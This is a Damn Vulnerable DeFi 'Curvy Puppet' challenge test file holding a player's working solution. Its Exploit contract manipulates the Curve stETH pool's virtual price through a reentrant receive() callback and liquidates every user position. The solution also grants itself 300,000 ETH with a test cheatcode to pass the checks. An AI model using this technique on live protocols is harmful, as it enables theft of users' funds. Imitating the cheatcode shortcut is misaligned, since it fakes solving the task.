// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE = 200e18;
    uint256 constant TREASURY_LP_BALANCE = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT = 1e18;
    uint256 constant ETHER_PRICE = 4000e18;
    uint256 constant DVT_PRICE = 10e18;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);
            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        // IStableSwap _curvePool, CurvyPuppetLending _lending, IERC20 _stETH , WETH _weth, address[] memory borrowers
        // vm.warp(block.timestamp + 2 days);
        address[] memory borrowers = new address[](3);
        borrowers[0] = alice;
        borrowers[1] = bob;
        borrowers[2] = charlie;
        weth.transferFrom(treasury, player, TREASURY_WETH_BALANCE);
        weth.withdraw(TREASURY_WETH_BALANCE);
        curvePool.add_liquidity{value: player.balance}([player.balance, 0], 0);
        console.log(IERC20(curvePool.lp_token()).balanceOf(player));


        deal(player, 300_000e18);
        Exploit exploit = new Exploit{value: 120_000e18}(curvePool, lending, permit2, dvt, stETH, weth, borrowers);
        // exploit.flashLoan();
        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(address(exploit), IERC20(curvePool.lp_token()).balanceOf(player));
        console.log(curvePool.get_virtual_price());
        address(stETH).call{value: 120_000e18}(abi.encodeWithSignature("submit(address)",address(0)));

        console.log("Player stETH balance: ", stETH.balanceOf(player));
        // address(exploit).call{value: 40_000e18}("");
        stETH.transfer(address(exploit), stETH.balanceOf(player) + 1);

        console.log("stETH.balanceOf(player)", stETH.balanceOf(player));

        exploit.remove_Liquidity();

        dvt.transfer(treasury, dvt.balanceOf(player));
        weth.transfer(treasury, 1 wei);
        IERC20(curvePool.lp_token()).transfer(treasury, 1 wei);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

import {IBalancerVault} from "./interface.sol";

interface IWSTETH is IERC20 {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
}


contract Exploit {

    IStableSwap internal immutable curvePool;
    CurvyPuppetLending internal immutable lending;
    IPermit2 internal immutable permit2;
    DamnValuableToken internal immutable dvt;
    IERC20 internal immutable stETH;
    WETH internal immutable weth;
    IBalancerVault internal constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWSTETH internal constant wstETH = IWSTETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    address internal immutable player;
    address[] internal to_liquidate;
    uint256 internal nonce;

    constructor(IStableSwap _curvePool, CurvyPuppetLending _lending, IPermit2 _permit2, DamnValuableToken _dvt, IERC20 _stETH , WETH _weth, address[] memory borrowers) payable {
        curvePool = _curvePool;
        lending = _lending;
        permit2 = _permit2;
        dvt = _dvt;
        stETH = _stETH;
        weth = _weth;
        to_liquidate = borrowers;
        player = msg.sender;
    }

    function remove_Liquidity() external {
        stETH.approve(address(curvePool), type(uint256).max);
        curvePool.exchange(1, 0, 35_000e18, 0);// 70K
        curvePool.add_liquidity([uint256(0), 85_000e18], 0);
        curvePool.add_liquidity{value: 75_000e18}([75_000e18, uint256(0)], 0);// 80k
        console.log("********************");
        console.log(IERC20(curvePool.lp_token()).balanceOf(address(this)));
        nonce+=1;
        IERC20(curvePool.lp_token()).approve(address(curvePool), type(uint256).max);
        curvePool.remove_liquidity_imbalance([uint256(1), 155_000e18], IERC20(curvePool.lp_token()).balanceOf(address(this)));
        nonce+=1;
        IERC20(curvePool.lp_token()).transfer(player, 1 wei);
        curvePool.remove_liquidity(IERC20(curvePool.lp_token()).balanceOf(address(this)), [uint256(0), 0]);
        console.log(address(this).balance);
        console.log(IERC20(curvePool.lp_token()).balanceOf(address(this)));
        curvePool.exchange(1, 0, 70_000e18, 0);
        console.log("stETH.balanceOf(address(this))", stETH.balanceOf(address(this)));
        // wstETH.wrap(stETH.balanceOf(address(this)));
        console.log(address(this).balance);
        console.log("weth.balanceOf(address(this))", weth.balanceOf(address(this)));
        weth.deposit{value: 1 wei}();
        weth.transfer(player, 1 wei);
        weth.withdraw(weth.balanceOf(address(this)));

        player.call{value: address(this).balance}("");
        dvt.transfer(player, dvt.balanceOf(address(this)));

    }
    receive() payable external {
        if(nonce == 1){
        console.log("Virtual price after manipulation", curvePool.get_virtual_price());

        console.log("LP: ", IERC20(curvePool.lp_token()).balanceOf(address(this)));

        IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: curvePool.lp_token(),
            spender: address(lending),
            amount: type(uint160).max,
            expiration: uint48(block.timestamp)
        });

        // console.log("Allowance: ", permit2.allowance(address(this), address(dvt)))

        for(uint256 i = 0; i < to_liquidate.length; i++){
        lending.liquidate(to_liquidate[i]);
        }
    }

    }

    function flashLoan() external{
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 35_000 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        console.log("we here");
        console.log("weth.balanceOf(player)",weth.balanceOf(address(this)));
    }
}